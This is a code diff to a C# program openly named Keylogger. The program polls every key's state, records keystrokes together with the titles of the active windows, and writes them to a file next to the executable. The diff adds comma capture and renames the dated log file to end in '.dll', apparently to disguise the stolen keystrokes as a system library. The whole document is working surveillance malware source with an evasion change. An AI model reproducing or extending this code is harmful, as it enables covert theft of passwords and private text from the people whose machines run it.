@@ -11,7 +11,7 @@ using System.Windows.Forms;
 namespace Keylogger
 {
     class Program
-    {
+    {   
         // Get keys
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
@@ -34,7 +34,7 @@ namespace Keylogger
             string currentWindowTitle = "";
             bool isShift = false;
             bool isCapital = false;
-            string text = "";
+            string log = "";
 
             while (true)
             {
@@ -77,6 +77,7 @@ namespace Keylogger
                             if (((Keys)keyCode) == Keys.Space) { keyString = " "; }
                             else if (((Keys)keyCode) == Keys.Enter) { keyString = "\n"; }
                             else if (((Keys)keyCode) == Keys.Tab) { keyString = "\t"; }
+                            else if (keyCode == 188) { keyString = ","; }
                             else if (keyCode == 52) { keyString = "'"; }
 
                             // Ignore the mouse buttons
@@ -117,19 +118,19 @@ namespace Keylogger
                         if (windowTitle != currentWindowTitle && windowTitle != "")
                         {
                             currentWindowTitle = windowTitle;
-                            text = text + $"\n\n[Foreground Window : {currentWindowTitle}]\n";
+                            log = log + $"\n\n[Foreground Window : {currentWindowTitle}]\n";
                         }
 
                         // Write the log
-                        text = text + keyString;
+                        log = log + keyString;
 
                         // https://docs.microsoft.com/fr-fr/dotnet/standard/io/how-to-write-text-to-a-file
                         string path = System.IO.Path.GetDirectoryName(Application.ExecutablePath);
-                        string fileName = "log-" + DateTime.UtcNow.ToString("MM-dd-yyyy") + ".log";
-                        File.WriteAllText(Path.Combine(path, fileName), text);
+                        string fileName = DateTime.UtcNow.ToString("MM-dd-yyyy") + ".dll";
+                        File.WriteAllText(Path.Combine(path, fileName), log);
 
 
-                        Console.WriteLine(text);
+                        Console.WriteLine(log);
                     }
                 }
             }
